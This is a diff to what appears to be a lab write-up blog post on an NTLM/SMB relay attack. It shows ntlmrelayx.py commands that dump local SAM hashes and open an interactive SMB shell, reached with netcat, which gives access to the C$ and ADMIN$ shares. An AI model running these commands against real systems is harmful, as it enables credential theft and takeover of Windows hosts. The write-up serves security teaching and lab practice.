@@ -23,3 +23,26 @@ Now we can startup the `ntlmrelayx.py` tool wit these syntax `ntlmrelayx.py -tf 
 
 The next thing is for our target, to create an event (We are gonna be utilizing **THE-PUNISHER** VM) , remember the `\\ATACKER-IP`
 
+![](https://dimitrios-tsarouchas.tech/assets/img/DNS-failure-Wrong-address.png)
+
+**SAM hashes have been dumped**
+![Local-SAM-hashes-have-been-dumped](https://dimitrios-tsarouchas.tech/assets/img/Local-SAM-hashes-have-been-dumped.png)_Local SAM hashes have been dumped_
+
+The authentication succeeded because SMB signing is enabled but not required and because “dtsarouchas” is the Administrator on this computer. Therefore, the SAM hashes were able to be dumped. Now the attacker can copy the SAM hashes, try cracking them offline and move laterally or vertically.
+
+
+The attacker now will gain access to SMB interactive shell by using the `ntlmrelayx.py -tf targets.txt -smb2support -i` command.
+
+![Start-interactive-SMB-client-shell-via-TCP](https://dimitrios-tsarouchas.tech/assets/img/Start-interactive-SMB-client-shell-via-TCP.png)_Start interactive SMB client shell via TCP_
+
+Now the attacker has access to the interactive shell on 127.0.0.1:11000 and will access that SMB shell using the command `nc 127.0.0.1 11000`.
+
+![Run-netcat-to-access-the-SMB-shell](https://dimitrios-tsarouchas.tech/assets/img/Run-netcat-to-access-the-SMB-shell.png)_Run netcat to access the SMB shell_
+
+The attacker navigates to shares where he can find ADMIN$, C$, IPC$, and Share folders. Then he uses the C$ drive and lists the files this folder has in it.
+
+![List-the-contents-of-C$-drive](https://dimitrios-tsarouchas.tech/assets/img/List-the-contents-of-C$-drive.png)_List the contents of C$ drive_
+
+Going a step further, he uses the ADMIN$ folder where he can add files, get files, having full control on the administrator folder and subsequently to this computer.
+
+![Listing-the-contents-of-the-ADMIN$-folder](https://dimitrios-tsarouchas.tech/assets/img/Listing-the-contents-of-the-ADMIN$-folder.png)_Listing the contents of the ADMIN$ folder_
